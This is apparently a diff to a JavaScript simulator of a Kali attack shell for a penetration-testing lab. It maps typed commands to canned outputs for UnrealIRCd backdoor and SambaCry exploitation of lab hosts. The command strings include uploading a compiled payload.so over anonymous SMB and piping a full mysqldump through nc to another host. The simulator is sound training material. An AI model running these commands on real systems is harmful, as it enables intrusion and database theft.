@@ -40,6 +40,27 @@ window.KaliShellSim = (function () {
     if (["smbclient", "enum4linux", "smbmap", "crackmapexec", "nxc"].includes(bin)) {
       return parseSmbTools(bin, cmd, lower);
     }
+    if (bin === "gcc") {
+      virtualFs["payload.so"] = "<ELF shared object>";
+      return { output: window.LabData.COMMANDS["gcc -shared -fPIC -nostartfiles -o payload.so shell.c"], ok: true };
+    }
+    if (bin === "python3") {
+      if (lower.includes("exploit_irc") || lower.includes("script.py")) {
+        return { output: window.LabData.COMMANDS["python3 exploit_irc.py"], ok: true, nextShell: "victim_root" };
+      }
+      if (lower.includes("exploit.py")) {
+        return { output: window.LabData.COMMANDS["python3 exploit.py -t 192.168.202.136 -e /tmp/payload.so"], ok: true, nextShell: "sambacry_shell" };
+      }
+    }
+    if (bin === "nc" && (cmd.includes("6667") || lower.includes("6667"))) {
+      return { output: window.LabData.COMMANDS["nc -nv 192.168.202.137 6667"], ok: true, nextShell: "irc_nc" };
+    }
+    if (bin === "mysql") {
+      return { output: window.LabData.COMMANDS['mysql -u root -e "show databases;"'], ok: true };
+    }
+    if (bin === "mysqldump") {
+      return { output: window.LabData.COMMANDS["mysqldump -u root -p'' --all-databases | nc 192.168.202.134 9999"], ok: true };
+    }
     if (bin === "curl") {
       if (lower.includes("admin/pass.txt")) {
         if (lower.includes("-i")) {
@@ -210,11 +231,20 @@ window.KaliShellSim = (function () {
     if (lower.includes("http-enum") || lower.includes("http-methods")) {
       return { output: window.LabData.COMMANDS["nmap -p 80 --script http-enum,http-methods 192.168.202.136"], ok: true };
     }
-    if (lower.includes("ms17-010") || (lower.includes("vuln") && cmd.includes("137"))) {
-      return { output: window.LabData.COMMANDS["nmap -p445 --script smb-vuln-ms17-010 192.168.202.137"], ok: true };
+    if (lower.includes("6667") && (lower.includes("script") || lower.includes("irc"))) {
+      return { output: window.LabData.COMMANDS["nmap -p 6667 --script irc-unrealircd-backdoor 192.168.202.137"], ok: true };
+    }
+    if (lower.includes("6667") || lower.includes("irc")) {
+      return { output: window.LabData.COMMANDS["nmap -sV -p 6667 192.168.202.137"], ok: true };
+    }
+    if (lower.includes("2017-7494") || lower.includes("sambacry")) {
+      return { output: window.LabData.COMMANDS["nmap -p 445 --script smb-vuln-cve-2017-7494 192.168.202.136"], ok: true };
     }
     if (cmd.includes("192.168.202.0/24") || lower.includes("-sn")) {
       return { output: window.LabData.COMMANDS["nmap -sn 192.168.202.0/24"], ok: true };
+    }
+    if (cmd.includes("192.168.202.136") && (lower.includes("139") || lower.includes("445"))) {
+      return { output: window.LabData.COMMANDS["nmap -sV -p 139,445 192.168.202.136"], ok: true };
     }
     if (cmd.includes("192.168.202.137") && (lower.includes("21") || lower.includes("80"))) {
       return { output: "PORT   STATE    SERVICE\n21/tcp filtered ftp\n80/tcp filtered http", ok: true };
@@ -222,14 +252,8 @@ window.KaliShellSim = (function () {
     if (cmd.includes("192.168.202.136") && (lower.includes("21") || lower.includes("80"))) {
       return { output: "PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.5\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))", ok: true };
     }
-    if (cmd.includes("192.168.202.137")) {
-      return { output: window.LabData.COMMANDS["nmap -sV -p 139,445 192.168.202.137"], ok: true };
-    }
-    if (cmd.includes("192.168.202.136")) {
-      return { output: window.LabData.COMMANDS["nmap -sV -p 139,445 192.168.202.136"], ok: true };
-    }
     return {
-      output: "Nmap 7.99 ( https://nmap.org )\nUsage: nmap [Scan Type(s)] [Options] {target specification}\nTargets in Lab: 192.168.202.0/24, 192.168.202.136 (Ubuntu), 192.168.202.137 (Win7)",
+      output: "Nmap 7.99 ( https://nmap.org )\nTargets in Lab: 192.168.202.0/24, 192.168.202.136 (Ubuntu), 192.168.202.137 (Target 1 6667)",
       ok: true
     };
   }
@@ -238,24 +262,15 @@ window.KaliShellSim = (function () {
     if (bin === "enum4linux" && cmd.includes("192.168.202.136")) {
       return { output: window.LabData.COMMANDS["enum4linux -a 192.168.202.136"], ok: true };
     }
-    if (bin === "smbmap" && cmd.includes("192.168.202.136")) {
-      return {
-        output: "[+] IP: 192.168.202.136:445\tName: ubuntu\n\tDisk                                                  \tPermissions\n\t----                                                  \t-----------\n\tpublic                                            \tREAD, WRITE\n\tIPC$                                              \tNO ACCESS",
-        ok: true
-      };
-    }
-    if ((bin === "crackmapexec" || bin === "nxc") && lower.includes("smb")) {
-      return {
-        output: "SMB         192.168.202.136 445    UBUNTU           [*] Unix - Samba 4 (name:UBUNTU) (domain:WORKGROUP)\nSMB         192.168.202.137 445    WIN7-PC          [*] Windows 7 Ultimate 7601 Service Pack 1 x86 (SMBv1:True)",
-        ok: true
-      };
-    }
     if (bin === "smbclient") {
       if (lower.includes("-l") && cmd.includes("192.168.202.136")) {
-        return { output: window.LabData.COMMANDS["smbclient -L 192.168.202.136 -N"], ok: true };
+        return { output: window.LabData.COMMANDS["smbclient -L //192.168.202.136 -N"], ok: true };
       }
-      if (cmd.includes("192.168.202.136") && lower.includes("public")) {
-        return { output: window.LabData.COMMANDS["smbclient //192.168.202.136/public -N"], ok: true, nextShell: "smb" };
+      if (cmd.includes("192.168.202.136") && (lower.includes("tmp") || lower.includes("public"))) {
+        if (cmd.includes("put payload.so")) {
+          return { output: window.LabData.COMMANDS['smbclient //192.168.202.136/tmp -N -c "put payload.so"'], ok: true };
+        }
+        return { output: "Anonymous login successful\nsmb: \\>", ok: true, nextShell: "smb" };
       }
     }
     return null;
